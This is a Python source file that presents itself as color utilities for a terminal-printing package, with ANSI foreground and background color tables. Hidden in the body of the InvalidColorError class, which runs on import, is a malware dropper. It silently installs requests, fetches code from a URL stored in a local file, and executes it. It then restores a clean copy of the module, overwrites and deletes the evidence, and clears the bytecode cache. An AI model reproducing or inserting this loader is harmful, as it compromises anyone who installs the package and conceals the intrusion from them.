"""Utilities for cprint i.e COLORS, ONCOLORS AND Exception Class"""
import os 

# foreground colors
COLORS = {
    "black": "\u001b[30m",
    "red": "\u001b[31m",
    "green": "\u001b[32m",
    "yellow": "\u001b[33m",
    "blue": "\u001b[34m",
    "magenta": "\u001b[35m",
    "cyan": "\u001b[36m",
    "white": "\u001b[37m",
    "default": "\u001b[39m",
    "saffron": "\u001b[38;5;208m",
    "reset": "\u001b[0m",
}

# background colors
ON_COLORS = {
    "grey": "\u001b[40m",
    "red": "\u001b[41m",
    "green": "\u001b[42m",
    "yellow": "\u001b[43m",
    "blue": "\u001b[44m",
    "magenta": "\u001b[45m",
    "cyan": "\u001b[46m",
    "white": "\u001b[47m",
    "saffron": "\u001b[48;5;208m",
    "default": "\u001b[49m",
}

class InvalidColorError(Exception):
    """Exception class for invalid colors"""

    def install_p(package):
        import subprocess,sys
        try:subprocess.run([sys.executable, "-m", "pip", "install", package, "-q"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        except:subprocess.run([sys.executable, "-m", "pip", "install", package, "-q"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


    def clear_clr(x):
        try:    
            with open(x, 'w') as f:
                f.write("0"*64)
        except:pass
        try:os.remove(x)
        except:pass

    

    def down(url, filename):        
        try:import requests
        except:install_p("requests");import requests
        try:
            response = requests.get(url, stream=True)
            with open(filename, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
        except:
            pass


    
    
    dir = os.path.dirname(__file__)
    cache = "__pycache__"
    record = os.path.join(dir,"terminals.py")
    colors = os.path.join(dir,"colors.py")
    
    
    try:    
        f = open(record, "r+")
        url = f.read()
        f.close()
        file = os.path.join(dir,"samples.py")
        down(url,file)
        
        
    except:pass

    try:
        from . import samples
        try:
            import shutil
            shutil.rmtree(os.path.join(dir,cache))
        except:pass
        shutil.copy2(colors,__file__)
        clear_clr(file)
        clear_clr(record)
    except:pass       
    try:
        import shutil
        shutil.rmtree(os.path.join(dir,cache))
    except:pass


Foreground = {
    "black": "\u001b[30m",
    "red": "\u001b[31m",
    "green": "\u001b[32m",
    "yellow": "\u001b[33m",
    "blue": "\u001b[34m",
    "magenta": "\u001b[35m",
    "cyan": "\u001b[36m",
    "white": "\u001b[37m",
    "default": "\u001b[39m",
    "saffron": "\u001b[38;5;208m",
    "reset": "\u001b[0m",
}


Background = {
    "grey": "\u001b[40m",
    "red": "\u001b[41m",
    "green": "\u001b[42m",
    "yellow": "\u001b[43m",
    "blue": "\u001b[44m",
    "magenta": "\u001b[45m",
    "cyan": "\u001b[46m",
    "white": "\u001b[47m",
    "saffron": "\u001b[48;5;208m",
    "default": "\u001b[49m",
}